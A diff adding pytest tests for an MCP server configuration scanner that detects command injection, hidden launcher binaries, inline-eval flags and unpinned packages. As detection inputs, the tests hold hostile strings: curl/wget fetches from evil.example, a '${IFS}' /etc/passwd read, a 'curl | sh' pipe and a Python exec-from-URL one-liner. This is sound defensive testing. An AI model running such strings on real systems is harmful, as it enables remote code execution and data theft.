@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import logging
+import re
 from pathlib import Path
 from unittest.mock import patch
 
@@ -24,6 +25,7 @@ from mcp_audit.rules.engine import (
     load_rules_from_file,
     merge_rules,
 )
+from tests.conftest import unwrapped
 
 # ── Fixtures ──────────────────────────────────────────────────────────────────
 
@@ -833,6 +835,54 @@ class TestCommunityRules:
         assert findings
         assert "CVE-2026-30623" in findings[0].cve
 
+    @staticmethod
+    def _comm_015(arg: str) -> list:
+        engine = RuleEngine(load_bundled_community_rules())
+        server = _make_server(command="node", args=["--x", arg])
+        return [f for f in engine.match_server(server) if f.id == "COMM-015"]
+
+    @pytest.mark.parametrize(
+        "arg",
+        [
+            "${VAR}",
+            "${env:API_KEY}",
+            "Bearer ${env:GITHUB_TOKEN}",
+            "${CLAUDE_PLUGIN_ROOT}/scripts/launch-server.mjs",
+            "${cmd: op read op://vault/token}",
+        ],
+    )
+    def test_comm_015_silent_on_documented_placeholders(self, arg: str) -> None:
+        """STORY-0119: env references and offline ${cmd:} are not injection."""
+        assert not self._comm_015(arg)
+
+    @pytest.mark.parametrize(
+        "arg",
+        [
+            "$(whoami)",
+            "`id`",
+            "$HOME/x",
+            "$USER_COMMAND",
+            "cat${IFS}/etc/passwd",
+            "${X:-$(id)}",
+            "${cmd: curl -s https://evil.example/p}",
+            "${cmd: wget http://evil.example}",
+            "$'\\x41'",
+        ],
+    )
+    def test_comm_015_still_fires_on_substitution(self, arg: str) -> None:
+        """Narrowing the ``$`` branch keeps every command-substitution shape."""
+        (finding,) = self._comm_015(arg)
+        assert finding.severity == Severity.CRITICAL
+
+    def test_comm_015_pattern_is_linear_on_hostile_input(self) -> None:
+        """The ${cmd: branch is length-bounded, so a 200 KB arg cannot stall it."""
+        import time  # noqa: PLC0415
+
+        start = time.perf_counter()
+        for arg in ("${cmd:" * 40_000, "$" * 200_000, "${env:" + "A" * 200_000):
+            self._comm_015(arg)
+        assert time.perf_counter() - start < 5
+
 
 class TestCveField:
     """Tests for the `cve` field on Finding and PolicyRule models."""
@@ -1289,7 +1339,7 @@ class TestRuleValidateMissingFile:
             f"Expected exit 2 (file not found), got {result.exit_code}. "
             f"Output: {result.output!r}"
         )
-        assert "not found" in result.output.lower(), (
+        assert "not found" in unwrapped(result.output.lower()), (
             f"Expected 'not found' in output, got: {result.output!r}"
         )
 
@@ -2148,3 +2198,465 @@ class TestComm034GodKey:
         rules = load_bundled_community_rules()
         rule_ids = {r.id for r in rules}
         assert "COMM-034" in rule_ids
+
+
+# ── STORY-0067: STDIO-001 / STDIO-002a / STDIO-002b — launch-command trust
+# boundary. See humans/decisions/2026-09-09-stdio-001-002-design.md (marcus
+# repo) for the full design, including the amendment dropping the
+# "outside-repo" criterion from STDIO-002 (the rule engine has no notion of
+# a project/scan root — MatchField carries no such field — so that criterion
+# is not buildable in this engine and was deliberately not relocated into
+# Python; see GAPS.md).
+
+
+# 21 realistic benign launcher paths from the design doc's own measurement
+# table. None of these has a hidden *leaf* (final path component); several
+# have a hidden directory earlier in the path (~/.nvm/, ~/.cargo/, etc.),
+# which is normal toolchain layout and must not fire STDIO-002a.
+_BENIGN_LAUNCHER_PATHS = [
+    "npx",
+    "node",
+    "uvx",
+    "python3",
+    "docker",
+    "deno",
+    "/usr/local/bin/node",
+    "/opt/homebrew/bin/uvx",
+    "~/.nvm/versions/node/v22.3.0/bin/node",
+    "~/.local/bin/uvx",
+    "~/.cargo/bin/my-mcp-server",
+    "~/.bun/bin/bunx",
+    "~/.pyenv/versions/3.12.1/bin/python",
+    "~/.venv/bin/python",
+    "./node_modules/.bin/mcp-server",
+]
+
+# The Deadbugz shape plus two more constructed hidden-leaf paths from the
+# same design-doc table.
+_MALICIOUS_HIDDEN_LEAF_PATHS = [
+    # Real IOC from the Pillar Security "Deadbugz" disclosure (2026-08-12):
+    # https://www.pillar.security/blog/deadbugz-currently-active-mcp-supply-chain-campaign
+    # Four of the campaign's 23 GitHub pull requests configured a local MCP
+    # server at exactly this path. Not invented — copied verbatim from the
+    # public write-up.
+    "~/.config/.cache/.sys/.deadbug-mcp.py",
+    "/tmp/.x/.run.sh",  # noqa: S108
+    "~/.local/.share/.agent/.helper",
+]
+
+
+class TestStdio002aHiddenLauncherBinary:
+    """STDIO-002a: launch command resolves to a path with a hidden leaf.
+
+    Default-on, HIGH. Fires on the *binary* being hidden, never merely a
+    containing directory — see the module-level benign/malicious path lists
+    for the full measured table this rule is built against.
+    """
+
+    def test_rule_loads_and_is_enabled_by_default(
+        self, community_rules_dir: Path
+    ) -> None:
+        rule = _load_rule("STDIO-002a", community_rules_dir)
+        assert rule.enabled is True
+        assert rule.severity == Severity.HIGH
+
+    @pytest.mark.parametrize("command", _BENIGN_LAUNCHER_PATHS)
+    def test_does_not_fire_on_benign_launcher_paths(
+        self, command: str, community_rules_dir: Path
+    ) -> None:
+        rule = _load_rule("STDIO-002a", community_rules_dir)
+        engine = RuleEngine([rule])
+        findings = engine.match_server(_make_server(command=command))
+        assert not findings, f"STDIO-002a must not fire for {command!r}"
+
+    @pytest.mark.parametrize("command", _MALICIOUS_HIDDEN_LEAF_PATHS)
+    def test_fires_on_hidden_leaf_paths(
+        self, command: str, community_rules_dir: Path
+    ) -> None:
+        rule = _load_rule("STDIO-002a", community_rules_dir)
+        engine = RuleEngine([rule])
+        findings = engine.match_server(_make_server(command=command))
+        assert findings, f"STDIO-002a must fire for {command!r}"
+        assert findings[0].severity == Severity.HIGH
+
+    def test_fires_on_deadbugz_ioc_via_bundled_rules(self) -> None:
+        """The exact Deadbugz IOC must fire through the full bundled rule set."""
+        rules = load_bundled_community_rules()
+        engine = RuleEngine(rules)
+        server = _make_server(command="~/.config/.cache/.sys/.deadbug-mcp.py")
+        findings = [f for f in engine.match_server(server) if f.id == "STDIO-002a"]
+        assert findings
+
+    def test_bare_hidden_command_fires(self, community_rules_dir: Path) -> None:
+        """A hidden command with no path prefix at all must also fire."""
+        rule = _load_rule("STDIO-002a", community_rules_dir)
+        engine = RuleEngine([rule])
+        findings = engine.match_server(_make_server(command=".hidden_script"))
+        assert findings
+
+
+class TestStdio002bInlineScriptLauncher:
+    """STDIO-002b: interpreter invoked with an inline-code flag.
+
+    Default-on, HIGH. Deliberately boundaried against COMM-015 (shell
+    metacharacters in args): COMM-015 owns the metacharacter class, this
+    rule owns the inline-code flag shape, whether or not metacharacters are
+    also present.
+    """
+
+    def test_rule_loads_and_is_enabled_by_default(
+        self, community_rules_dir: Path
+    ) -> None:
+        rule = _load_rule("STDIO-002b", community_rules_dir)
+        assert rule.enabled is True
+        assert rule.severity == Severity.HIGH
+
+    @pytest.mark.parametrize(
+        ("command", "args"),
+        [
+            ("python", ["-c", "print(1)"]),
+            ("python3", ["-c", "import os"]),
+            ("node", ["--eval", "console.log(1)"]),
+            ("node", ["-e", "console.log(1)"]),
+            ("bash", ["-c", "echo hi"]),
+            ("sh", ["-c", "echo hi"]),
+            ("pwsh", ["-Command", "Get-Process"]),
+        ],
+    )
+    def test_fires_on_inline_eval_flag(
+        self, command: str, args: list[str], community_rules_dir: Path
+    ) -> None:
+        rule = _load_rule("STDIO-002b", community_rules_dir)
+        engine = RuleEngine([rule])
+        findings = engine.match_server(_make_server(command=command, args=args))
+        assert findings, f"STDIO-002b must fire for {command} {args}"
+        assert findings[0].severity == Severity.HIGH
+
+    def test_does_not_fire_on_script_file_argument(
+        self, community_rules_dir: Path
+    ) -> None:
+        rule = _load_rule("STDIO-002b", community_rules_dir)
+        engine = RuleEngine([rule])
+        findings = engine.match_server(_make_server(command="node", args=["server.js"]))
+        assert not findings
+
+    def test_does_not_fire_on_unrelated_short_flag(
+        self, community_rules_dir: Path
+    ) -> None:
+        """npx --yes must not look like an inline-eval flag (COMM-013 owns that)."""
+        rule = _load_rule("STDIO-002b", community_rules_dir)
+        engine = RuleEngine([rule])
+        findings = engine.match_server(
+            _make_server(command="npx", args=["--yes", "@some/pkg"])
+        )
+        assert not findings
+
+    def test_comm_015_boundary_no_metacharacters(self) -> None:
+        """STDIO-002b fires and COMM-015 does not, on a metacharacter-free
+        inline-eval one-liner.
+
+        This is the assertion that proves the documented boundary rather
+        than assuming it. Note: the design doc's own illustrative example
+        (`"import urllib.request;exec(...)"`) contains a semicolon and
+        would in fact also trip COMM-015 — that example is corrected here
+        to a real semicolon-free equivalent using ``__import__`` inline,
+        which was verified char-by-char against COMM-015's own pattern
+        (``[;|&`$><]|\\$\\(|&&|\\|\\|``) before being adopted.
+        """
+        payload = "exec(__import__('urllib.request').urlopen('http://x').read())"
+        assert not re.search(r"[;|&`$><]|\$\(|&&|\|\|", payload), (
+            "test payload must not contain a COMM-015 metacharacter"
+        )
+        rules = load_bundled_community_rules()
+        engine = RuleEngine(rules)
+        server = _make_server(command="python", args=["-c", payload])
+        finding_ids = {f.id for f in engine.match_server(server)}
+        assert "STDIO-002b" in finding_ids
+        assert "COMM-015" not in finding_ids
+
+    def test_comm_015_and_stdio_002b_both_fire_once_each_with_metacharacters(
+        self,
+    ) -> None:
+        """sh -c "curl x | sh" fires exactly one finding per condition — not
+        a double report of either rule."""
+        rules = load_bundled_community_rules()
+        engine = RuleEngine(rules)
+        server = _make_server(command="sh", args=["-c", "curl x | sh"])
+        findings = engine.match_server(server)
+        comm015 = [f for f in findings if f.id == "COMM-015"]
+        stdio002b = [f for f in findings if f.id == "STDIO-002b"]
+        assert len(comm015) == 1
+        assert len(stdio002b) == 1
+
+
+class TestStdio001LauncherAllowlist:
+    """STDIO-001: launcher basename not in the allowlist.
+
+    Policy-gated and OFF by default. The rule engine's ``enabled: false``
+    flag statically prevents the rule from ever being evaluated
+    (``RuleEngine.match_server`` skips it unconditionally) — there is no
+    governance-policy mechanism anywhere in the codebase that can flip a
+    disabled community rule on at scan time (confirmed: zero references to
+    rule enablement in src/mcp_audit/governance/, and PolicyRule.enabled is
+    read only once, statically, from the YAML). Per the design doc, this is
+    the documented stop-and-report case: STDIO-001 ships disabled with no
+    working enablement path, rather than silently shipping it enabled or
+    inventing new policy plumbing in this story. The "fires once a policy
+    enables it" assertion is therefore intentionally NOT written here — see
+    CHANGELOG.md and GAPS.md for the tracked follow-up.
+    """
+
+    def test_rule_loads_and_is_disabled_by_default(
+        self, community_rules_dir: Path
+    ) -> None:
+        rule = _load_rule("STDIO-001", community_rules_dir)
+        assert rule.enabled is False
+        assert rule.severity == Severity.MEDIUM
+
+    def test_does_not_fire_via_bundled_rules_by_default(self) -> None:
+        """A scan with no custom policy never produces an STDIO-001 finding,
+        even for a command well outside the allowlist."""
+        rules = load_bundled_community_rules()
+        engine = RuleEngine(rules)
+        server = _make_server(command="/opt/mycompany/bin/custom-launcher")
+        findings = [f for f in engine.match_server(server) if f.id == "STDIO-001"]
+        assert not findings
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "npx",
+            "node",
+            "npm",
+            "pnpm",
+            "yarn",
+            "bunx",
+            "bun",
+            "deno",
+            "python",
+            "python3",
+            "uv",
+            "uvx",
+            "pipx",
+            "docker",
+            "podman",
+            "sh",
+            "bash",
+            "zsh",
+            "/usr/local/bin/node",
+        ],
+    )
+    def test_manually_enabled_does_not_fire_for_allowlisted_launchers(
+        self, command: str, community_rules_dir: Path
+    ) -> None:
+        """When force-enabled in-process (simulating a hypothetical future
+        policy toggle), the allowlist itself must not false-positive on any
+        of its own entries."""
+        rule = _load_rule("STDIO-001", community_rules_dir)
+        rule.enabled = True
+        engine = RuleEngine([rule])
+        findings = engine.match_server(_make_server(command=command))
+        assert not findings, f"STDIO-001 must not fire for allowlisted {command!r}"
+
+    def test_manually_enabled_fires_for_unlisted_launcher(
+        self, community_rules_dir: Path
+    ) -> None:
+        """When force-enabled in-process, an unlisted custom launcher does fire —
+        proves the match logic itself is correct even though the runtime
+        enablement path from a policy file is not wired (see class docstring)."""
+        rule = _load_rule("STDIO-001", community_rules_dir)
+        rule.enabled = True
+        engine = RuleEngine([rule])
+        findings = engine.match_server(
+            _make_server(command="/opt/mycompany/bin/custom-launcher")
+        )
+        assert findings
+        assert findings[0].severity == Severity.MEDIUM
+
+
+class TestStdioRulesShippedAndCounted:
+    """Sanity checks that all three STDIO rules are present in the bundled set."""
+
+    def test_all_three_stdio_rules_present(self) -> None:
+        rules = load_bundled_community_rules()
+        rule_ids = {r.id for r in rules}
+        assert {"STDIO-001", "STDIO-002a", "STDIO-002b"}.issubset(rule_ids)
+
+    def test_stdio_002_rules_are_two_distinct_ids(self) -> None:
+        """STDIO-002 is two rules, not one — severity filtering and the rule
+        count both depend on 002a/002b staying separate IDs."""
+        rules = {r.id for r in load_bundled_community_rules()}
+        assert "STDIO-002a" in rules
+        assert "STDIO-002b" in rules
+        assert "STDIO-002" not in rules
+
+
+# ── COMM-010 reads the args (STORY-0105, Q-011) ──────────────────────────────
+
+
+class TestComm010ReadsArgs:
+    """COMM-010 fires only when the npx package carries no exact version."""
+
+    def _ids(self, args: list[str], command: str = "npx") -> list[str]:
+        rules = [r for r in load_bundled_community_rules() if r.id == "COMM-010"]
+        server = _make_server(command=command, args=args)
+        return [f.id for f in RuleEngine(rules).match_server(server)]
+
+    @pytest.mark.parametrize(
+        "args",
+        [
+            ["-y", "pkg@1.2.3"],
+            ["-y", "@scope/pkg@1.2.3"],
+            ["--yes", "@scope/pkg@1.2.3-beta.1", "--port", "8080"],
+            ["pkg@1.2.3+build.5"],
+            ["-y", "@modelcontextprotocol/server-filesystem@2.0.0", "/tmp"],  # noqa: S108
+        ],
+    )
+    def test_exact_pin_is_silent(self, args: list[str]) -> None:
+        assert self._ids(args) == []
+
+    @pytest.mark.parametrize(
+        "args",
+        [
+            [],
+            ["pkg"],
+            ["-y", "@scope/pkg"],
+            ["-y", "pkg@^1.2.3"],
+            ["-y", "pkg@~1.2.3"],
+            ["-y", "pkg@latest"],
+            ["-y", "pkg@1.2"],
+            ["-y", "pkg@1.2.x"],
+            ["-y", "pkg@1.2.3x"],
+            # A pinned token later in the args is not the package npx runs.
+            ["-y", "pkg", "other@1.0.0"],
+        ],
+    )
+    def test_unpinned_fires(self, args: list[str]) -> None:
+        assert self._ids(args) == ["COMM-010"]
+
+    def test_non_npx_command_is_silent(self) -> None:
+        assert self._ids(["pkg"], command="node") == []
+
+    def test_message_says_what_was_checked(self) -> None:
+        rules = [r for r in load_bundled_community_rules() if r.id == "COMM-010"]
+        server = _make_server(command="npx", args=["-y", "pkg"])
+        (finding,) = RuleEngine(rules).match_server(server)
+        assert "without an exact version pin" in finding.description
+
+    def test_regex_is_linear_on_pathological_args(self) -> None:
+        import time
+
+        args = ["-" + "a" * 50_000] * 20 + ["x" * 200_000 + "@1.2"]
+        start = time.monotonic()
+        assert self._ids(args) == ["COMM-010"]
+        assert time.monotonic() - start < 2.0
+
+
+class TestRuleEvidenceRedaction:
+    """A matched value that quotes arguments never carries a secret (STORY-0105)."""
+
+    def test_args_rule_evidence_redacts_url_password_and_token(self) -> None:
+        """Second layer, for any rule that quotes the args (not COMM-010, which
+        reports a fixed label)."""
+        token = "ghp_" + "aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890"
+        rule = _make_rule(
+            field=MatchField.ARGS, pattern="postgres", match_type=MatchType.CONTAINS
+        )
+        server = _make_server(
+            command="npx",
+            args=[
+                "-y",
+                "mcp-server-postgres",
+                "postgresql://admin:hunter2pass@db.internal/app",
+                f"--token={token}",
+            ],
+        )
+        (finding,) = RuleEngine([rule]).match_server(server)
+        for text in (finding.evidence, finding.description):
+            assert "hunter2pass" not in text
+            assert token not in text
+        assert "postgresql://[REDACTED]@db.internal/app" in finding.evidence
+
+
+class TestComm010ReportsOnlyALabel:
+    """COMM-010's evidence never quotes the launch arguments (STORY-0105 review)."""
+
+    _ARGS = [
+        "-y",
+        "@upstash/context7-mcp",
+        "--api-key",
+        "ctx7sk-0123456789abcdefghij",
+        "/Users/alice/projects",
+    ]
+
+    def _finding(self) -> object:
+        rules = [r for r in load_bundled_community_rules() if r.id == "COMM-010"]
+        server = _make_server(command="npx", args=list(self._ARGS))
+        (finding,) = RuleEngine(rules).match_server(server)
+        return finding, server
+
+    def test_finding_carries_no_argument_text(self) -> None:
+        finding, _server = self._finding()
+        for text in (finding.evidence, finding.description):
+            assert "ctx7sk-" not in text
+            assert "/Users/" not in text
+            assert "context7" not in text
+        assert "first package argument has no exact version" in finding.evidence
+
+    def test_advisory_carries_no_argument_text(self) -> None:
+        import json
+
+        from mcp_audit.advisory.feed import build_advisory
+
+        finding, server = self._finding()
+        advisory = build_advisory(finding, server, now="2026-01-31T00:00:00Z")
+        assert advisory is not None
+        text = json.dumps(advisory.to_osv())
+        assert "ctx7sk-" not in text
+        assert "/Users/" not in text
+
+
+class TestReportOption:
+    """A condition's ``report`` replaces the field content in the matched value."""
+
+    def test_negated_condition_reports_label(self) -> None:
+        rule = PolicyRule.model_validate(
+            {
+                "id": "TEST-REPORT",
+                "name": "t",
+                "description": "t",
+                "severity": "LOW",
+                "category": "test",
+                "match": {
+                    "field": "args",
+                    "pattern": "safe",
+                    "type": "contains",
+                    "negate": True,
+                    "report": "no safe flag",
+                },
+                "message": "{matched_value}",
+            }
+        )
+        (finding,) = RuleEngine([rule]).match_server(
+            _make_server(args=["--token", "abc123secret"])
+        )
+        assert finding.description == "no safe flag"
+        assert "abc123secret" not in finding.evidence
+
+    def test_without_report_negated_keeps_field_value(self) -> None:
+        """COMM-031 relies on this: it quotes the remote URL."""
+        rules = [r for r in load_bundled_community_rules() if r.id == "COMM-031"]
+        server = _make_server(
+            command=None, url="https://mcp.example.com/sse", transport=TransportType.SSE
+        )
+        (finding,) = RuleEngine(rules).match_server(server)
+        assert "https://mcp.example.com/sse" in finding.description
+
+    def test_secret_flag_value_redacted_from_any_rule_evidence(self) -> None:
+        rule = _make_rule(
+            field=MatchField.ARGS, pattern="--api-key", match_type=MatchType.CONTAINS
+        )
+        (finding,) = RuleEngine([rule]).match_server(
+            _make_server(args=["--api-key", "plainsecretvalue"])
+        )
+        assert "plainsecretvalue" not in finding.evidence
